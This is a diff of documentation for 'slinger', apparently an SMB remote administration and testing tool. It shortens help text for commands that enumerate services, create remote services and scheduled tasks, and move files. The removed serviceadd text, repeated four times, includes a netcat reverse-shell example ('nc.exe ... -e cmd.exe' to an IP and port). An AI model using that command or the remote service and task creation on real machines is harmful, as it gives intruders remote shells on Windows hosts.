@@ -6,18 +6,8 @@
 
 **Help:**
 ```
-usage: slinger use [-h] share
-
+use [-h] share
 Connect to a specific share on the remote server
-
-positional arguments:
-  share       Specify the share name to connect to
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: use sharename
-
 ```
 
 **Example Usage:**
@@ -38,22 +28,8 @@ Example Usage: use sharename
 
 **Help:**
 ```
-usage: slinger ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [-sr] [-l] [path]
-
+ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [-sr] [-l] [-r depth] [path]
 List contents of a directory at a specified path
-
-positional arguments:
-  path                  Path to list contents, defaults to current path
-
-options:
-  -h, --help            show this help message and exit
-  -s {name,size,created,lastaccess,lastwrite}, --sort {name,size,created,lastaccess,lastwrite}
-                        Sort the directory contents by name, size, or date
-  -sr, --sort-reverse   Reverse the sort order
-  -l, --long            Display long format listing
-
-Example Usage: ls /path/to/directory
-
 ```
 
 **Example Usage:**
@@ -72,6 +48,9 @@ Example Usage: ls /path/to/directory
   - Default: `date`
   - Required: No
 
+- **`recursive`**: Recursively list directory contents with X depth
+  - Required: No
+
 ---
 
 ## `shares`
@@ -80,15 +59,8 @@ Example Usage: ls /path/to/directory
 
 **Help:**
 ```
-usage: slinger shares [-h]
-
+shares [-h]
 List all shares available on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: shares
-
 ```
 
 **Example Usage:**
@@ -104,15 +76,8 @@ Example Usage: shares
 
 **Help:**
 ```
-usage: slinger shares [-h]
-
+shares [-h]
 List all shares available on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: shares
-
 ```
 
 **Example Usage:**
@@ -128,18 +93,8 @@ Example Usage: shares
 
 **Help:**
 ```
-usage: slinger cat [-h] remote_path
-
+cat [-h] remote_path
 Display the contents of a specified file on the remote server
-
-positional arguments:
-  remote_path  Specify the remote file path to display contents
-
-options:
-  -h, --help   show this help message and exit
-
-Example Usage: cat /path/to/file
-
 ```
 
 **Example Usage:**
@@ -160,18 +115,8 @@ Example Usage: cat /path/to/file
 
 **Help:**
 ```
-usage: slinger cd [-h] [path]
-
+cd [-h] [path]
 Change to a different directory on the remote server
-
-positional arguments:
-  path        Directory path to change to, defaults to current directory
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: cd /path/to/directory
-
 ```
 
 **Example Usage:**
@@ -193,15 +138,8 @@ Example Usage: cd /path/to/directory
 
 **Help:**
 ```
-usage: slinger pwd [-h]
-
+pwd [-h]
 Print the current working directory on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: pwd
-
 ```
 
 **Example Usage:**
@@ -217,15 +155,8 @@ Example Usage: pwd
 
 **Help:**
 ```
-usage: slinger exit [-h]
-
+exit [-h]
 Exit the application
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: exit
-
 ```
 
 **Example Usage:**
@@ -241,15 +172,8 @@ Example Usage: exit
 
 **Help:**
 ```
-usage: slinger exit [-h]
-
+exit [-h]
 Exit the application
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: exit
-
 ```
 
 **Example Usage:**
@@ -265,15 +189,8 @@ Example Usage: exit
 
 **Help:**
 ```
-usage: slinger exit [-h]
-
+exit [-h]
 Exit the application
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: exit
-
 ```
 
 **Example Usage:**
@@ -289,15 +206,8 @@ Example Usage: exit
 
 **Help:**
 ```
-usage: slinger exit [-h]
-
+exit [-h]
 Exit the application
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: exit
-
 ```
 
 **Example Usage:**
@@ -313,15 +223,8 @@ Example Usage: exit
 
 **Help:**
 ```
-usage: slinger clear [-h]
-
+clear [-h]
 Clear the screen
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: clear
-
 ```
 
 **Example Usage:**
@@ -337,18 +240,8 @@ Example Usage: clear
 
 **Help:**
 ```
-usage: slinger help [-h] [cmd]
-
+help [-h] [cmd]
 Display help information for the application
-
-positional arguments:
-  cmd         Specify a command to show help for
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: help
-
 ```
 
 **Example Usage:**
@@ -369,15 +262,8 @@ Example Usage: help
 
 **Help:**
 ```
-usage: slinger who [-h]
-
+who [-h]
 List the current sessions connected to the target host
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: who
-
 ```
 
 **Example Usage:**
@@ -393,15 +279,8 @@ Example Usage: who
 
 **Help:**
 ```
-usage: slinger enumdisk [-h]
-
+enumdisk [-h]
 Enumerate server disk information
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enumdisk
-
 ```
 
 **Example Usage:**
@@ -417,15 +296,8 @@ Example Usage: enumdisk
 
 **Help:**
 ```
-usage: slinger enumlogons [-h]
-
+enumlogons [-h]
 Enumerate users currently logged on the server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enumlogons
-
 ```
 
 **Example Usage:**
@@ -441,15 +313,8 @@ Example Usage: enumlogons
 
 **Help:**
 ```
-usage: slinger enuminfo [-h]
-
+enuminfo [-h]
 Enumerate detailed information about the remote host
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enuminfo
-
 ```
 
 **Example Usage:**
@@ -465,15 +330,8 @@ Example Usage: enuminfo
 
 **Help:**
 ```
-usage: slinger enumsys [-h]
-
+enumsys [-h]
 Enumerate system information of the remote host
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enumsys
-
 ```
 
 **Example Usage:**
@@ -489,15 +347,8 @@ Example Usage: enumsys
 
 **Help:**
 ```
-usage: slinger enumtransport [-h]
-
+enumtransport [-h]
 Enumerate transport information of the remote host
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enumtransport
-
 ```
 
 **Example Usage:**
@@ -513,17 +364,8 @@ Example Usage: enumtransport
 
 **Help:**
 ```
-usage: slinger enumservices [-h] [-n] [--filter FILTER]
-
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
-
-options:
-  -h, --help       show this help message and exit
-  -n, --new        Perform a new enumeration of services even if already enumerated
-  --filter FILTER  Filter services by name or state
-
-Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
-
 ```
 
 **Example Usage:**
@@ -544,17 +386,8 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-usage: slinger enumservices [-h] [-n] [--filter FILTER]
-
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
-
-options:
-  -h, --help       show this help message and exit
-  -n, --new        Perform a new enumeration of services even if already enumerated
-  --filter FILTER  Filter services by name or state
-
-Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
-
 ```
 
 **Example Usage:**
@@ -575,17 +408,8 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-usage: slinger enumservices [-h] [-n] [--filter FILTER]
-
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
-
-options:
-  -h, --help       show this help message and exit
-  -n, --new        Perform a new enumeration of services even if already enumerated
-  --filter FILTER  Filter services by name or state
-
-Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
-
 ```
 
 **Example Usage:**
@@ -606,17 +430,8 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-usage: slinger enumservices [-h] [-n] [--filter FILTER]
-
+enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
-
-options:
-  -h, --help       show this help message and exit
-  -n, --new        Perform a new enumeration of services even if already enumerated
-  --filter FILTER  Filter services by name or state
-
-Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
-
 ```
 
 **Example Usage:**
@@ -637,20 +452,8 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-usage: slinger serviceshow [-h] (-i SERVICEID | service_name)
-
+serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to show
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to show details for
-
-Example Usage: serviceshow -i 123
-
 ```
 
 **Example Usage:**
@@ -674,20 +477,8 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-usage: slinger serviceshow [-h] (-i SERVICEID | service_name)
-
+serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to show
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to show details for
-
-Example Usage: serviceshow -i 123
-
 ```
 
 **Example Usage:**
@@ -711,20 +502,8 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-usage: slinger serviceshow [-h] (-i SERVICEID | service_name)
-
+serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to show
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to show details for
-
-Example Usage: serviceshow -i 123
-
 ```
 
 **Example Usage:**
@@ -748,20 +527,8 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-usage: slinger servicestart [-h] (-i SERVICEID | service_name)
-
+servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to start
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to start
-
-Example Usage: servicestart -i 123 OR svcstart Spooler
-
 ```
 
 **Example Usage:**
@@ -785,20 +552,8 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-usage: slinger servicestart [-h] (-i SERVICEID | service_name)
-
+servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to start
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to start
-
-Example Usage: servicestart -i 123 OR svcstart Spooler
-
 ```
 
 **Example Usage:**
@@ -822,20 +577,8 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-usage: slinger servicestart [-h] (-i SERVICEID | service_name)
-
+servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to start
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to start
-
-Example Usage: servicestart -i 123 OR svcstart Spooler
-
 ```
 
 **Example Usage:**
@@ -859,20 +602,8 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-usage: slinger servicestop [-h] (-i SERVICEID | service_name)
-
+servicestop [-h] (-i SERVICEID | service_name)
 Stop a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to stop
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to stop
-
-Example Usage: servicestop -i 123 OR svcstop Spooler
-
 ```
 
 **Example Usage:**
@@ -896,20 +627,8 @@ Example Usage: servicestop -i 123  OR svcstop Spooler
 
 **Help:**
 ```
-usage: slinger servicestop [-h] (-i SERVICEID | service_name)
-
+servicestop [-h] (-i SERVICEID | service_name)
 Stop a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to stop
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to stop
-
-Example Usage: servicestop -i 123 OR svcstop Spooler
-
 ```
 
 **Example Usage:**
@@ -933,20 +652,8 @@ Example Usage: servicestop -i 123  OR svcstop Spooler
 
 **Help:**
 ```
-usage: slinger serviceenable [-h] (-i SERVICEID | service_name)
-
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to enable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to enable
-
-Example Usage: serviceenable -i 123 OR svcenable Spooler
-
 ```
 
 **Example Usage:**
@@ -970,20 +677,8 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-usage: slinger serviceenable [-h] (-i SERVICEID | service_name)
-
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to enable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to enable
-
-Example Usage: serviceenable -i 123 OR svcenable Spooler
-
 ```
 
 **Example Usage:**
@@ -1007,20 +702,8 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-usage: slinger serviceenable [-h] (-i SERVICEID | service_name)
-
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to enable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to enable
-
-Example Usage: serviceenable -i 123 OR svcenable Spooler
-
 ```
 
 **Example Usage:**
@@ -1044,20 +727,8 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-usage: slinger serviceenable [-h] (-i SERVICEID | service_name)
-
+serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to enable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to enable
-
-Example Usage: serviceenable -i 123 OR svcenable Spooler
-
 ```
 
 **Example Usage:**
@@ -1081,20 +752,8 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-usage: slinger servicedisable [-h] (-i SERVICEID | service_name)
-
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to disable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to disable
-
-Example Usage: servicedisable -i 123 OR svcdisable Spooler
-
 ```
 
 **Example Usage:**
@@ -1118,20 +777,8 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-usage: slinger servicedisable [-h] (-i SERVICEID | service_name)
-
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to disable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to disable
-
-Example Usage: servicedisable -i 123 OR svcdisable Spooler
-
 ```
 
 **Example Usage:**
@@ -1155,20 +802,8 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-usage: slinger servicedisable [-h] (-i SERVICEID | service_name)
-
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to disable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to disable
-
-Example Usage: servicedisable -i 123 OR svcdisable Spooler
-
 ```
 
 **Example Usage:**
@@ -1192,20 +827,8 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-usage: slinger servicedisable [-h] (-i SERVICEID | service_name)
-
+servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to disable
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to disable
-
-Example Usage: servicedisable -i 123 OR svcdisable Spooler
-
 ```
 
 **Example Usage:**
@@ -1229,20 +852,8 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-usage: slinger servicedel [-h] (-i SERVICEID | service_name)
-
+servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to delete
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to delete
-
-Example Usage: servicedelete -i 123 OR svcdelete Spooler
-
 ```
 
 **Example Usage:**
@@ -1266,20 +877,8 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-usage: slinger servicedel [-h] (-i SERVICEID | service_name)
-
+servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to delete
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to delete
-
-Example Usage: servicedelete -i 123 OR svcdelete Spooler
-
 ```
 
 **Example Usage:**
@@ -1303,20 +902,8 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-usage: slinger servicedel [-h] (-i SERVICEID | service_name)
-
+servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
-
-positional arguments:
-  service_name          Specify the name of the service to delete
-
-options:
-  -h, --help            show this help message and exit
-  -i SERVICEID, --serviceid SERVICEID
-                        Specify the ID of the service to delete
-
-Example Usage: servicedelete -i 123 OR svcdelete Spooler
-
 ```
 
 **Example Usage:**
@@ -1340,23 +927,8 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
-
+serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
 Create a new service on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -n SERVICENAME, --servicename SERVICENAME
-                        Specify the name of the new service
-  -b BINARYPATH, --binarypath BINARYPATH
-                        Specify the binary path of the new service
-  -d DISPLAYNAME, --displayname DISPLAYNAME
-                        Specify the display name of the new service
-  -s {auto,demand,system}, --starttype {auto,demand,system}
-                        Specify the start type of the new service
-
-Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
-
 ```
 
 **Example Usage:**
@@ -1388,23 +960,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
-
+serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
 Create a new service on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -n SERVICENAME, --servicename SERVICENAME
-                        Specify the name of the new service
-  -b BINARYPATH, --binarypath BINARYPATH
-                        Specify the binary path of the new service
-  -d DISPLAYNAME, --displayname DISPLAYNAME
-                        Specify the display name of the new service
-  -s {auto,demand,system}, --starttype {auto,demand,system}
-                        Specify the start type of the new service
-
-Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
-
 ```
 
 **Example Usage:**
@@ -1436,23 +993,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
-
+serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
 Create a new service on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -n SERVICENAME, --servicename SERVICENAME
-                        Specify the name of the new service
-  -b BINARYPATH, --binarypath BINARYPATH
-                        Specify the binary path of the new service
-  -d DISPLAYNAME, --displayname DISPLAYNAME
-                        Specify the display name of the new service
-  -s {auto,demand,system}, --starttype {auto,demand,system}
-                        Specify the start type of the new service
-
-Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
-
 ```
 
 **Example Usage:**
@@ -1484,23 +1026,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-usage: slinger serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
-
+serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
 Create a new service on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -n SERVICENAME, --servicename SERVICENAME
-                        Specify the name of the new service
-  -b BINARYPATH, --binarypath BINARYPATH
-                        Specify the binary path of the new service
-  -d DISPLAYNAME, --displayname DISPLAYNAME
-                        Specify the display name of the new service
-  -s {auto,demand,system}, --starttype {auto,demand,system}
-                        Specify the start type of the new service
-
-Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
-
 ```
 
 **Example Usage:**
@@ -1532,15 +1059,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-usage: slinger enumtasks [-h]
-
+enumtasks [-h]
 Enumerate scheduled tasks on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enumtasks
-
 ```
 
 **Example Usage:**
@@ -1556,15 +1076,8 @@ Example Usage: enumtasks
 
 **Help:**
 ```
-usage: slinger enumtasks [-h]
-
+enumtasks [-h]
 Enumerate scheduled tasks on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enumtasks
-
 ```
 
 **Example Usage:**
@@ -1580,15 +1093,8 @@ Example Usage: enumtasks
 
 **Help:**
 ```
-usage: slinger enumtasks [-h]
-
+enumtasks [-h]
 Enumerate scheduled tasks on the remote server
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: enumtasks
-
 ```
 
 **Example Usage:**
@@ -1604,20 +1110,8 @@ Example Usage: enumtasks
 
 **Help:**
 ```
-usage: slinger taskshow [-h] (-i TASKID | task_path)
-
+taskshow [-h] (-i TASKID | task_path)
 Show details of a specific task on the remote server
-
-positional arguments:
-  task_path             Specify the full path of the task to show
-
-options:
-  -h, --help            show this help message and exit
-  -i TASKID, --taskid TASKID
-                        Specify the ID of the task to show
-
-Example Usage: tasksshow -i 123
-
 ```
 
 **Example Usage:**
@@ -1641,20 +1135,8 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-usage: slinger taskshow [-h] (-i TASKID | task_path)
-
+taskshow [-h] (-i TASKID | task_path)
 Show details of a specific task on the remote server
-
-positional arguments:
-  task_path             Specify the full path of the task to show
-
-options:
-  -h, --help            show this help message and exit
-  -i TASKID, --taskid TASKID
-                        Specify the ID of the task to show
-
-Example Usage: tasksshow -i 123
-
 ```
 
 **Example Usage:**
@@ -1678,20 +1160,8 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-usage: slinger taskshow [-h] (-i TASKID | task_path)
-
+taskshow [-h] (-i TASKID | task_path)
 Show details of a specific task on the remote server
-
-positional arguments:
-  task_path             Specify the full path of the task to show
-
-options:
-  -h, --help            show this help message and exit
-  -i TASKID, --taskid TASKID
-                        Specify the ID of the task to show
-
-Example Usage: tasksshow -i 123
-
 ```
 
 **Example Usage:**
@@ -1715,25 +1185,8 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-usage: slinger taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
-
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -n NAME, --name NAME  Specify the name of the new task
-  -p PROGRAM, --program PROGRAM
-                        Specify the program to run (cmd.exe)
-  -a ARGUMENTS, --arguments ARGUMENTS
-                        Specify the arguments to pass to the program
-  -f FOLDER, --folder FOLDER
-                        Specify the folder to create the task in
-  -i INTERVAL, --interval INTERVAL
-                        Specify an interval in minutes to run the task
-  -d DATE, --date DATE  Specify the date to start the task (2099-12-31 14:01:00)
-
-Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
-
 ```
 
 **Example Usage:**
@@ -1770,25 +1223,8 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-usage: slinger taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
-
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
-
-options:
-  -h, --help            show this help message and exit
-  -n NAME, --name NAME  Specify the name of the new task
-  -p PROGRAM, --program PROGRAM
-                        Specify the program to run (cmd.exe)
-  -a ARGUMENTS, --arguments ARGUMENTS
-                        Specify the arguments to pass to the program
-  -f FOLDER, --folder FOLDER
-                        Specify the folder to create the task in
-  -i INTERVAL, --interval INTERVAL
-                        Specify an interval in minutes to run the task
-  -d DATE, --date DATE  Specify the date to start the task (2099-12-31 14:01:00)
-
-Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
-
 ```
 
 **Example Usage:**
@@ -1825,18 +1261,8 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-usage: slinger taskrun [-h] task_path
-
+taskrun [-h] task_path
 Run a specified task on the remote server
-
-positional arguments:
-  task_path   Specify the full path of the task to run
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: taskrun \\Windows\\newtask
-
 ```
 
 **Example Usage:**
@@ -1857,18 +1283,8 @@ Example Usage: taskrun \\Windows\\newtask
 
 **Help:**
 ```
-usage: slinger taskrun [-h] task_path
-
+taskrun [-h] task_path
 Run a specified task on the remote server
-
-positional arguments:
-  task_path   Specify the full path of the task to run
-
-options:
-  -h, --help  show this help message and exit
-
-Example Usage: taskrun \\Windows\\newtask
-
 ```
 
 **Example Usage:**
@@ -1889,20 +1305,8 @@ Example Usage: taskrun \\Windows\\newtask
 
 **Help:**
 ```
-usage: slinger taskdelete [-h] [-i TASKID] [task_path]
-
+taskdelete [-h] [-i TASKID] [task_path]
 Delete a specified task on the remote server
-
-positional arguments:
-  task_path             Specify the full path of the task to delete
-
-options:
-  -h, --help            show this help message and exit
-  -i TASKID, --taskid TASKID
-                        Specify the ID of the task to delete
-
-Example Usage: taskdelete -i 123
-
 ```
 
 **Example Usage:**
@@ -1926,20 +1330,8 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-usage: slinger taskdelete [-h] [-i TASKID] [task_path]
-
+taskdelete [-h] [-i TASKID] [task_path]
 Delete a specified task on the remote server
-
-positional arguments:
-  task_path             Specify the full path of the task to delete
-
-options:
-  -h, --help            show this help message and exit
-  -i TASKID, --taskid TASKID
-                        Specify the ID of the task to delete
-
-Example Usage: taskdelete -i 123
-
 ```
 
 **Example Usage:**
@@ -1963,20 +1355,8 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-usage: slinger taskdelete [-h] [-i TASKID] [task_path]
-
+taskdelete [-h] [-i TASKID] [task_path]
 Delete a specified task on the remote server
-
-positional arguments:
-  task_path             Specify the full path of the task to delete
-
-options:
-  -h, --help            show this help message and exit
-  -i TASKID, --taskid TASKID
-                        Specify the ID of the task to delete
-
-Example Usage: taskdelete -i 123
-
 ```
 
 **Example Usage:**
@@ -2000,19 +1380,8 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-usage: slinger upload [-h] local_path [remote_path]
-
+upload [-h] local_path [remote_path]
 Upload a file to the remote server
-
-positional arguments:
-  local_path   Specify the local file path to upload
-  remote_path  Specify the remote file path to upload to, optional
-
-options:
-  -h, --help   show this help message and exit
-
-Example Usage: upload /local/path /remote/path
-
 ```
 
 **Example Usage:**
@@ -2036,19 +1405,8 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-usage: slinger upload [-h] local_path [remote_path]
-
+upload [-h] local_path [remote_path]
 Upload a file to the remote server
-
-positional arguments:
-  local_path   Specify the local file path to upload
-  remote_path  Specify the remote file path to upload to, optional
-
-options:
-  -h, --help   show this help message and exit
-
-Example Usage: upload /local/path /remote/path
-
 ```
 
 **Example Usage:**
@@ -2072,19 +1430,8 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-usage: slinger download [-h] remote_path [local_path]
-
+download [-h] remote_path [local_path]
 Download a file from the remote server
-
-positional arguments:
-  remote_path  Specify the remote file path to download
-  local_path   Specify the local file path to download to, optional
-
-options:
-  -h, --help   show this help message and exit
-
-Example Usage: download /remote/path /local/path
-
 ```
 
 **Example Usage:**
@@ -2108,19 +1455,8 @@ Example Usage: download /remote/path /local/path
 
 **Help:**
 ```
-usage: slinger download [-h] remote_path [local_path]
-
+download [-h] remote_path [local_path]
 Download a file from the remote server
-
-positional arguments:
-  remote_path  Specify the remote file path to download
-  local_path   Specify the local file path to download to, optional
-
-options:
-  -h, --help   show this help message and exit
-
-Example Usage: download /remote/path /local/path
-
 ```
 
 **Example Usage:**
@@ -2144,22 +1480,8 @@ Example Usage: download /remote/path /local/path
 
 **Help:**
 ```
-usage: slinger mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
-
+mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
 Download all files from a specified directory and its subdirectories
-
-positional arguments:
-  remote_path  Specify the remote directory path to download from
-  local_path   Specify the local directory path where files will be downloaded
-
-options:
-  -h, --help   show this help message and exit
